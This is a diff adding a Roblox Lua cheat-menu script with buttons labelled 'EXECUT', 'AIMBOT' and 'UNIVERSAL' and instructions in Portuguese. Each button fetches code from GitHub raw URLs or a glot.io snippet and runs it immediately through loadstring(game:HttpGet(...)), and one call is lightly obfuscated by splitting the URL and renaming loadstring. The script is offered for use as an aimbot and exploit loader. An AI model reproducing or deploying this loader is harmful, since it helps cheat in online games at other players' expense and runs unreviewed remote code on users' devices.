@@ -1,0 +1,124 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Button = Instance.new("TextButton")
+local CloseButton = Instance.new("TextButton")
+local BlueButton = Instance.new("TextButton")
+local PurpleButton = Instance.new("TextButton")
+local RedButton = Instance.new("TextButton")
+local InfoLabel = Instance.new("TextLabel")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Button.Parent = ScreenGui
+Button.Size = UDim2.new(0, 200, 0, 150)
+Button.Position = UDim2.new(0.5, -100, 0.5, -75)
+Button.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
+Button.BackgroundTransparency = 0.5
+Button.Text = ""
+
+local texts = {"OP-SCRIPTS v1.0", "AIMBOT", "RINNS HUB", "UNIVERSAL"}
+local labels = {}
+
+for i, text in ipairs(texts) do
+    local TextLabel = Instance.new("TextLabel")
+    TextLabel.Parent = Button
+    TextLabel.Size = UDim2.new(1, 0, 1/#texts, 0)
+    TextLabel.Position = UDim2.new(0, 0, (i-1) / #texts, 0)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Text = text
+    TextLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    TextLabel.TextScaled = true
+    table.insert(labels, TextLabel)
+end
+
+local function randomColor()
+    return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+end
+
+local function changeColors()
+    while true do
+        labels[2].TextColor3 = randomColor()
+        labels[3].TextColor3 = randomColor()
+        labels[4].TextColor3 = randomColor()
+        wait(0.2)
+    end
+end
+
+coroutine.wrap(changeColors)()
+
+local Title = Instance.new("TextLabel")
+Title.Parent = ScreenGui
+Title.Size = UDim2.new(0, 200, 0, 25)
+Title.Position = UDim2.new(0.5, -100, 0.5, -75 - 25)
+Title.BackgroundTransparency = 1
+Title.Text = "[SCRIPTS-OP]"
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.TextScaled = true
+
+InfoLabel.Parent = ScreenGui
+InfoLabel.Size = UDim2.new(0, 200, 0, 25)
+InfoLabel.Position = UDim2.new(0.5, -100, 0.5, 75)
+InfoLabel.BackgroundTransparency = 1
+InfoLabel.Text = "CLICK EM EXECUT PARA ATIVA OS SCRIPTS v1.0"
+InfoLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+InfoLabel.TextScaled = true
+
+CloseButton.Parent = ScreenGui
+CloseButton.Size = UDim2.new(0, 11, 0, 11)
+CloseButton.Position = UDim2.new(0.5, 100, 0.5, -75)
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseButton.Text = "❌️"
+CloseButton.TextScaled = true
+
+BlueButton.Parent = ScreenGui
+BlueButton.Size = UDim2.new(0, 35, 0, 25)
+BlueButton.Position = UDim2.new(0.5, -135, 0.5, -75)
+BlueButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+BlueButton.Text = "EXECUT"
+BlueButton.TextColor3 = Color3.fromRGB(255, 255, 0)
+BlueButton.TextScaled = true
+
+PurpleButton.Parent = ScreenGui
+PurpleButton.Size = UDim2.new(0, 35, 0, 25)
+PurpleButton.Position = UDim2.new(0.5, -135, 0.5, -50)
+PurpleButton.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
+PurpleButton.Text = "AIMBOT"
+PurpleButton.TextColor3 = Color3.fromRGB(255, 0, 0)
+PurpleButton.TextScaled = true
+
+RedButton.Parent = ScreenGui
+RedButton.Size = UDim2.new(0, 35, 0, 25)
+RedButton.Position = UDim2.new(0.5, -135, 0.5, -25)
+RedButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+RedButton.Text = "UNIVERSAL"
+RedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+RedButton.TextScaled = true
+
+local isVisible = true
+local function ToggleVisibility()
+    isVisible = not isVisible
+    Button.Visible = isVisible
+    Title.Visible = isVisible
+    InfoLabel.Visible = isVisible
+    BlueButton.Visible = isVisible
+    PurpleButton.Visible = isVisible
+    RedButton.Visible = isVisible
+end
+
+CloseButton.MouseButton1Click:Connect(ToggleVisibility)
+BlueButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
+end)
+PurpleButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jonthedruger/LatvixDoc/script/idkgamenameforgot.lua", true))()
+end)
+RedButton.MouseButton1Click:Connect(function()
+    RedButton.TextColor3 = Color3.fromRGB(0, 255, 0)
+    if "you wanna use rochips universal" then
+        local z_x, z_z = "gzrux646yj/raw/main.ts", "https://glot.io/snippets/"
+        local im, lonely, z_c = task.wait, game, loadstring
+        z_c(lonely:HttpGet(z_z..""..z_x))()
+        return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
+    end
+end)
+
+game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild(ScreenGui)
